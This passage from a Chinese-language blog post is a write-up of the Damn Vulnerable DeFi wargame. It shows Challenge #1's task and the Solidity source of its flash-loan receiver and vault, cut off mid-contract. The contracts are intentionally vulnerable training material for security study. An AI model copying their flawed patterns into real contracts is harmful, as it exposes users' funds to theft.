<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="Challenge #1 - Unstoppable">
<meta property="og:type" content="article">
<meta property="og:title" content="Damn Vulnerable DeFi(未完待续)">
<meta property="og:url" content="http://example.com/2023/11/12/DamnVulnerableDeFi/index.html">
<meta property="og:site_name" content="scw&#39;s Blog">
<meta property="og:description" content="Challenge #1 - Unstoppable">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-11-12T06:58:09.000Z">
<meta property="article:modified_time" content="2023-12-07T17:35:26.479Z">
<meta property="article:author" content="scw">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/2023/11/12/DamnVulnerableDeFi/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/11/12/DamnVulnerableDeFi/","path":"2023/11/12/DamnVulnerableDeFi/","title":"Damn Vulnerable DeFi(未完待续)"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Damn Vulnerable DeFi(未完待续) | scw's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">scw's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-1-Unstoppable"><span class="nav-number">1.</span> <span class="nav-text">Challenge #1 - Unstoppable</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code"><span class="nav-number">1.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ReceiverUnstoppable-sol"><span class="nav-number">1.1.1.</span> <span class="nav-text">ReceiverUnstoppable.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#UnstoppableVault-sol"><span class="nav-number">1.1.2.</span> <span class="nav-text">UnstoppableVault.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack"><span class="nav-number">1.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-2-Naive-receiver"><span class="nav-number">2.</span> <span class="nav-text">Challenge #2 - Naive receiver</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-1"><span class="nav-number">2.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#FlashLoanReceiver-sol"><span class="nav-number">2.1.1.</span> <span class="nav-text">FlashLoanReceiver.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#NaiveReceiverLenderPool-sol"><span class="nav-number">2.1.2.</span> <span class="nav-text">NaiveReceiverLenderPool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-1"><span class="nav-number">2.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-3-Truster"><span class="nav-number">3.</span> <span class="nav-text">Challenge #3 - Truster</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-2"><span class="nav-number">3.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#TrusterLenderPool-sol"><span class="nav-number">3.1.1.</span> <span class="nav-text">TrusterLenderPool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-2"><span class="nav-number">3.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-2"><span class="nav-number">3.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-4-Side-Entrance"><span class="nav-number">4.</span> <span class="nav-text">Challenge #4 - Side Entrance</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-3"><span class="nav-number">4.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SideEntranceLenderPool-sol"><span class="nav-number">4.1.1.</span> <span class="nav-text">SideEntranceLenderPool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-3"><span class="nav-number">4.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-3"><span class="nav-number">4.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SideEntranceLenderPoolAttack-sol"><span class="nav-number">4.3.1.</span> <span class="nav-text">SideEntranceLenderPoolAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js"><span class="nav-number">4.3.2.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-5-The-Rewarder"><span class="nav-number">5.</span> <span class="nav-text">Challenge #5 - The Rewarder</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-4"><span class="nav-number">5.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#AccountingToken-sol"><span class="nav-number">5.1.1.</span> <span class="nav-text">AccountingToken.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FlashLoanerPool-sol"><span class="nav-number">5.1.2.</span> <span class="nav-text">FlashLoanerPool.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#RewardToken-sol"><span class="nav-number">5.1.3.</span> <span class="nav-text">RewardToken.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#TheRewarderPool-sol"><span class="nav-number">5.1.4.</span> <span class="nav-text">TheRewarderPool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-4"><span class="nav-number">5.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-4"><span class="nav-number">5.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#TheRewarderPoolAttack-sol"><span class="nav-number">5.3.1.</span> <span class="nav-text">TheRewarderPoolAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js-1"><span class="nav-number">5.3.2.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-6-Selfie"><span class="nav-number">6.</span> <span class="nav-text">Challenge #6 - Selfie</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-5"><span class="nav-number">6.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ISimpleGovernance-sol"><span class="nav-number">6.1.1.</span> <span class="nav-text">ISimpleGovernance.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SimpleGovernance-sol"><span class="nav-number">6.1.2.</span> <span class="nav-text">SimpleGovernance.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SelfiePool-sol"><span class="nav-number">6.1.3.</span> <span class="nav-text">SelfiePool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-5"><span class="nav-number">6.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-5"><span class="nav-number">6.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SelfiePoolAttack-sol"><span class="nav-number">6.3.1.</span> <span class="nav-text">SelfiePoolAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js-2"><span class="nav-number">6.3.2.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-7-Compromised"><span class="nav-number">7.</span> <span class="nav-text">Challenge #7 - Compromised</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-6"><span class="nav-number">7.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#TrustfulOracle-sol"><span class="nav-number">7.1.1.</span> <span class="nav-text">TrustfulOracle.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#TrustfulOracleInitializer-sol"><span class="nav-number">7.1.2.</span> <span class="nav-text">TrustfulOracleInitializer.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Exchange-sol"><span class="nav-number">7.1.3.</span> <span class="nav-text">Exchange.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-6"><span class="nav-number">7.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-6"><span class="nav-number">7.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#js-3"><span class="nav-number">7.3.1.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-8-Puppet"><span class="nav-number">8.</span> <span class="nav-text">Challenge #8 - Puppet</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-7"><span class="nav-number">8.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PuppetPool-sol"><span class="nav-number">8.1.1.</span> <span class="nav-text">PuppetPool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-7"><span class="nav-number">8.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-7"><span class="nav-number">8.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#js-4"><span class="nav-number">8.3.1.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-9-Puppet-V2"><span class="nav-number">9.</span> <span class="nav-text">Challenge #9 - Puppet V2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-8"><span class="nav-number">9.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PuppetV2Pool-sol"><span class="nav-number">9.1.1.</span> <span class="nav-text">PuppetV2Pool.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-8"><span class="nav-number">9.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-8"><span class="nav-number">9.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#js-5"><span class="nav-number">9.3.1.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-10-Free-Rider"><span class="nav-number">10.</span> <span class="nav-text">Challenge #10 - Free Rider</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-9"><span class="nav-number">10.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#FreeRiderRecovery-sol"><span class="nav-number">10.1.1.</span> <span class="nav-text">FreeRiderRecovery.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FreeRiderNFTMarketplace-sol"><span class="nav-number">10.1.2.</span> <span class="nav-text">FreeRiderNFTMarketplace.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-9"><span class="nav-number">10.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-9"><span class="nav-number">10.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#FreeRiderNFTMarketplaceAttack-sol"><span class="nav-number">10.3.1.</span> <span class="nav-text">FreeRiderNFTMarketplaceAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js-6"><span class="nav-number">10.3.2.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-11-Backdoor"><span class="nav-number">11.</span> <span class="nav-text">Challenge #11 - Backdoor</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-10"><span class="nav-number">11.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WalletRegistry-sol"><span class="nav-number">11.1.1.</span> <span class="nav-text">WalletRegistry.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Analysis-10"><span class="nav-number">11.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-10"><span class="nav-number">11.3.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WalletRegistryAttack-sol"><span class="nav-number">11.3.1.</span> <span class="nav-text">WalletRegistryAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WalletRegistryAttack2-sol"><span class="nav-number">11.3.2.</span> <span class="nav-text">WalletRegistryAttack2.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js-7"><span class="nav-number">11.3.3.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-12-Climber"><span class="nav-number">12.</span> <span class="nav-text">Challenge #12 - Climber</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Code-11"><span class="nav-number">12.1.</span> <span class="nav-text">Code</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberConstants-sol"><span class="nav-number">12.1.1.</span> <span class="nav-text">ClimberConstants.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberErrors-sol"><span class="nav-number">12.1.2.</span> <span class="nav-text">ClimberErrors.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberTimelock-sol"><span class="nav-number">12.1.3.</span> <span class="nav-text">ClimberTimelock.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberTimelockBase-sol"><span class="nav-number">12.1.4.</span> <span class="nav-text">ClimberTimelockBase.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberVault-sol"><span class="nav-number">12.1.5.</span> <span class="nav-text">ClimberVault.sol</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Attack-11"><span class="nav-number">12.2.</span> <span class="nav-text">Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ClimberVaultAttack-sol"><span class="nav-number">12.2.1.</span> <span class="nav-text">ClimberVaultAttack.sol</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#js-8"><span class="nav-number">12.2.2.</span> <span class="nav-text">js</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">scw</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/12/DamnVulnerableDeFi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="scw">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="scw's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="Damn Vulnerable DeFi(未完待续) | scw's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Damn Vulnerable DeFi(未完待续)
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-11-12 14:58:09" itemprop="dateCreated datePublished" datetime="2023-11-12T14:58:09+08:00">2023-11-12</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-12-08 01:35:26" itemprop="dateModified" datetime="2023-12-08T01:35:26+08:00">2023-12-08</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h3 id="Challenge-1-Unstoppable"><a href="#Challenge-1-Unstoppable" class="headerlink" title="Challenge #1 - Unstoppable"></a>Challenge #1 - Unstoppable</h3><span id="more"></span>

<p>There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.</p>
<p>To pass the challenge, make the vault stop offering flash loans.</p>
<p>You start with 10 DVT tokens in balance.</p>
<h4 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h4><h5 id="ReceiverUnstoppable-sol"><a href="#ReceiverUnstoppable-sol" class="headerlink" title="ReceiverUnstoppable.sol"></a>ReceiverUnstoppable.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line">import &quot;solmate/src/auth/Owned.sol&quot;;</span><br><span class="line">import &#123; UnstoppableVault, ERC20 &#125; from &quot;../unstoppable/UnstoppableVault.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title ReceiverUnstoppable</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract ReceiverUnstoppable is Owned, IERC3156FlashBorrower &#123;</span><br><span class="line">    UnstoppableVault private immutable pool;</span><br><span class="line"></span><br><span class="line">    error UnexpectedFlashLoan();</span><br><span class="line"></span><br><span class="line">    constructor(address poolAddress) Owned(msg.sender) &#123;</span><br><span class="line">        pool = UnstoppableVault(poolAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(</span><br><span class="line">        address initiator,</span><br><span class="line">        address token,</span><br><span class="line">        uint256 amount,</span><br><span class="line">        uint256 fee,</span><br><span class="line">        bytes calldata</span><br><span class="line">    ) external returns (bytes32) &#123;</span><br><span class="line">        if (initiator != address(this) || msg.sender != address(pool) || token != address(pool.asset()) || fee != 0)</span><br><span class="line">            revert UnexpectedFlashLoan();</span><br><span class="line"></span><br><span class="line">        ERC20(token).approve(address(pool), amount);</span><br><span class="line"></span><br><span class="line">        return keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeFlashLoan(uint256 amount) external onlyOwner &#123;</span><br><span class="line">        address asset = address(pool.asset());</span><br><span class="line">        pool.flashLoan(</span><br><span class="line">            this,</span><br><span class="line">            asset,</span><br><span class="line">            amount,</span><br><span class="line">            bytes(&quot;&quot;)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="UnstoppableVault-sol"><a href="#UnstoppableVault-sol" class="headerlink" title="UnstoppableVault.sol"></a>UnstoppableVault.sol</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;solmate/src/utils/FixedPointMathLib.sol&quot;;</span><br><span class="line">import &quot;solmate/src/utils/ReentrancyGuard.sol&quot;;</span><br><span class="line">import &#123; SafeTransferLib, ERC4626, ERC20 &#125; from &quot;solmate/src/mixins/ERC4626.sol&quot;;</span><br><span class="line">import &quot;solmate/src/auth/Owned.sol&quot;;</span><br><span class="line">import &#123; IERC3156FlashBorrower, IERC3156FlashLender &#125; from &quot;@openzeppelin/contracts/interfaces/IERC3156.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title UnstoppableVault</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626 &#123;</span><br><span class="line">    using SafeTransferLib for ERC20;</span><br><span class="line">    using FixedPointMathLib for uint256;</span><br><span class="line"></span><br><span class="line">    uint256 public constant FEE_FACTOR = 0.05 ether;</span><br><span class="line">    uint64 public constant GRACE_PERIOD = 30 days;</span><br><span class="line"></span><br><span class="line">    uint64 public immutable end = uint64(block.timestamp) + GRACE_PERIOD;</span><br><span class="line"></span><br><span class="line">    address public feeRecipient;</span><br><span class="line"></span><br><span class="line">    error InvalidAmount(uint256 amount);</span><br><span class="line">    error InvalidBalance();</span><br><span class="line">    error CallbackFailed();</span><br><span class="line">    error UnsupportedCurrency();</span><br><span class="line"></span><br><span class="line">    event FeeRecipientUpdated(address indexed newFeeRecipient);</span><br><span class="line"></span><br><span class="line">    constructor(ERC20 _token, address _owner, address _feeRecipient)</span><br><span class="line">        ERC4626(_token, &quot;Oh Damn Valuable Token&quot;, &quot;oDVT&quot;)</span><br><span class="line">        Owned(_owner)</span><br><span class="line">    &#123;</span><br><span class="line">        feeRecipient = _feeRecipient;</span><br><span class="line">        emit FeeRecipientUpdated(_feeRecipient);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @inheritdoc IERC3156FlashLender</span><br><span class="line">     */</span><br><span class="line">    function maxFlashLoan(address _token) public view returns (uint256) &#123;</span><br><span class="line">        if (address(asset) != _token)</span><br><span class="line">            